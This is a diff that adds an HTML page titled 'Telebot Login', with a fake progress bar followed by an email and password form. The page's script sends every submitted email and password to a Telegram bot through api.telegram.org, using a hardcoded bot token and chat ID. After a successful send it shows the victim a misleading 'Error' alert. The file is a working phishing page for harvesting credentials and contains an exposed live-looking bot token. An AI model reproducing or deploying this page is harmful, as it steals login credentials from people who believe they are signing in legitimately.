@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telebot Login</title>
+    <style>
+        :root {
+            /* Colors */
+            --body-bg-color: #414747;
+            --form-bg-color: #4E5454;
+            --form-border-color: #424848;
+
+            --heading-text-color: #FFFFFF;
+            --input-text-color: #333333;
+            --button-text-color: #080B0B;
+            --message-text-color: #A3ADAE;
+
+            --input-bg-color: #f9f9f9;
+            --input-border-color: #cccccc;
+            --button-bg-color: #A2ADAE;
+            --button-hover-bg-color: #A3ADAE;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: var(--body-bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            flex-direction: column;
+        }
+
+        h1 {
+            color: var(--heading-text-color);
+            margin-bottom: 20px;
+            font-size: 36px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        /* Progress Bar */
+        .progress-bar-container {
+            width: 80%;
+            height: 30px;
+            background-color: #000000;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: #ff0000;
+            width: 0%;
+            border-radius: 15px;
+            transition: width 0.03s linear;
+        }
+
+        .percentage {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 20px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+
+        form {
+            background-color: var(--form-bg-color);
+            border: 1px solid var(--form-border-color);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgb(43, 41, 41);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+            opacity: 0;
+            animation: fadeIn 1s forwards 3s;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        label {
+            font-size: 16px;
+            color: var(--heading-text-color);
+            display: block;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .input-field {
+            width: 100%;
+            margin: 10px 0;
+            padding: 12px;
+            border: 1px solid var(--input-border-color);
+            border-radius: 5px;
+            background-color: var(--input-bg-color);
+            font-size: 16px;
+            color: var(--input-text-color);
+            box-sizing: border-box;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--button-bg-color);
+        }
+
+        button {
+            padding: 12px 20px;
+            background-color: var(--button-bg-color);
+            color: var(--button-text-color);
+            border: none;
+            border-radius: 80px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 200px;
+            box-sizing: border-box;
+        }
+
+        button:hover {
+            background-color: var(--button-hover-bg-color);
+        }
+
+        .footer {
+            color: var(--message-text-color);
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: var(--message-text-color);
+            text-decoration: none;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            form {
+                padding: 15px;
+            }
+
+            .input-field {
+                padding: 10px;
+                font-size: 14px;
+            }
+
+            button {
+                padding: 10px;
+                font-size: 14px;
+            }
+
+            .footer {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Progress Bar -->
+    <div class="progress-bar-container" id="progressBarContainer">
+        <div class="progress-bar" id="progressBar"></div>
+        <div class="percentage" id="percentageText">0%</div>
+    </div>
+
+    <!-- Login Form -->
+    <form id="loginForm">
+        <h1>Login</h1>
+
+        <label for="email">Email</label>
+        <input type="email" id="email" class="input-field" placeholder="Your Email here" required>
+
+        <label for="password">Password</label>
+        <input type="password" id="password" class="input-field" placeholder="Your Password here" required>
+
+        <button type="submit">Login</button>
+
+        <p class="footer">
+            © Copy Claims By <a href="#">Telebot Creator</a>
+        </p>
+    </form>
+
+    <script>
+        // JavaScript Logic for Progress Bar
+        const progressBar = document.getElementById('progressBar');
+        const percentageText = document.getElementById('percentageText');
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            if (progress >= 100) {
+                clearInterval(interval);
+                document.getElementById('progressBarContainer').style.display = 'none'; // Hide progress bar
+            } else {
+                progress++;
+                progressBar.style.width = progress + '%';
+                percentageText.textContent = progress + '%';
+            }
+        }, 30); // Progress updates every 30ms
+
+        // Telegram Bot Integration
+        const BOT_TOKEN = "7639272626:AAEPusULIxR--QcaAx0kgE1OmDhmrbs4k48";
+        const CHAT_ID = "7480276527";
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Error');
+                } else {
+                    alert('Failed to send message to Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred.');
+            });
+        });
+    </script>
+</body>
+</html>
